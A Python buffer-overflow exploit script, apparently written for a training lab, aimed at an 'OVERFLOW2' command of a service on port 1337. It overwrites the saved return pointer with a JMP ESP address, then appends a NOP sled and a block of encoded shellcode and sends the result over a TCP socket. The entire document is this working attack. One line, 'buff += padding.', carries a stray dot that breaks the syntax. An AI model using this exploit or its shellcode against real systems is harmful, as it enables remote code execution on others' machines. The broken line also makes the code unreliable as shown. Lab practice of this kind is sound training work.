#!/usr/bin/python

import sys,socket,struct

IP="10.10.56.49"
port=1337
SRP_offset = 634                                        

pointer_JMP_ESP = 0x625011AF

padding = b"\x90" * 16
#sub_ESP_10 = b"\x83\xec\x10"           Used to mitigate shikata_ga_nai's GETPC routine. Needed when payload is encoded. Also, watch out for badchars

payload =  b""
payload += b"\xfc\xbb\xf1\x2b\x64\x2f\xeb\x0c\x5e\x56\x31\x1e"
payload += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
payload += b"\xff\x0d\xc3\xe6\x2f\xed\x14\x87\xa6\x08\x25\x87"
payload += b"\xdd\x59\x16\x37\x95\x0f\x9b\xbc\xfb\xbb\x28\xb0"
payload += b"\xd3\xcc\x99\x7f\x02\xe3\x1a\xd3\x76\x62\x99\x2e"
payload += b"\xab\x44\xa0\xe0\xbe\x85\xe5\x1d\x32\xd7\xbe\x6a"
payload += b"\xe1\xc7\xcb\x27\x3a\x6c\x87\xa6\x3a\x91\x50\xc8"
payload += b"\x6b\x04\xea\x93\xab\xa7\x3f\xa8\xe5\xbf\x5c\x95"
payload += b"\xbc\x34\x96\x61\x3f\x9c\xe6\x8a\xec\xe1\xc6\x78"
payload += b"\xec\x26\xe0\x62\x9b\x5e\x12\x1e\x9c\xa5\x68\xc4"
payload += b"\x29\x3d\xca\x8f\x8a\x99\xea\x5c\x4c\x6a\xe0\x29"
payload += b"\x1a\x34\xe5\xac\xcf\x4f\x11\x24\xee\x9f\x93\x7e"
payload += b"\xd5\x3b\xff\x25\x74\x1a\xa5\x88\x89\x7c\x06\x74"
payload += b"\x2c\xf7\xab\x61\x5d\x5a\xa4\x46\x6c\x64\x34\xc1"
payload += b"\xe7\x17\x06\x4e\x5c\xbf\x2a\x07\x7a\x38\x4c\x32"
payload += b"\x3a\xd6\xb3\xbd\x3b\xff\x77\xe9\x6b\x97\x5e\x92"
payload += b"\xe7\x67\x5e\x47\xa7\x37\xf0\x38\x08\xe7\xb0\xe8"
payload += b"\xe0\xed\x3e\xd6\x11\x0e\x95\x7f\xbb\xf5\x7e\x8a"
payload += b"\x3a\xda\x10\xe2\x40\x24\xfc\xae\xcd\xc2\x94\x5e"
payload += b"\x98\x5d\x01\xc6\x81\x15\xb0\x07\x1c\x50\xf2\x8c"
payload += b"\x93\xa5\xbd\x64\xd9\xb5\x2a\x85\x94\xe7\xfd\x9a"
payload += b"\x02\x8f\x62\x08\xc9\x4f\xec\x31\x46\x18\xb9\x84"
payload += b"\x9f\xcc\x57\xbe\x09\xf2\xa5\x26\x71\xb6\x71\x9b"
payload += b"\x7c\x37\xf7\xa7\x5a\x27\xc1\x28\xe7\x13\x9d\x7e"
payload += b"\xb1\xcd\x5b\x29\x73\xa7\x35\x86\xdd\x2f\xc3\xe4"
payload += b"\xdd\x29\xcc\x20\xa8\xd5\x7d\x9d\xed\xea\xb2\x49"
payload += b"\xfa\x93\xae\xe9\x05\x4e\x6b\x09\xe4\x5a\x86\xa2"
payload += b"\xb1\x0f\x2b\xaf\x41\xfa\x68\xd6\xc1\x0e\x11\x2d"
payload += b"\xd9\x7b\x14\x69\x5d\x90\x64\xe2\x08\x96\xdb\x03"
payload += b"\x19\x96\xdb\xfb\xa2"

buff = b"OVERFLOW2 "                                    #Prefix
buff += ("A" * SRP_offset).encode()                     #Padding
buff += struct.pack("<I", pointer_JMP_ESP)              #SRP overwrite
buff += padding.                                        # ESP points here 
buff += payload                                         #Shellcode
buff += b"\r\n"

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send ((buff))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()

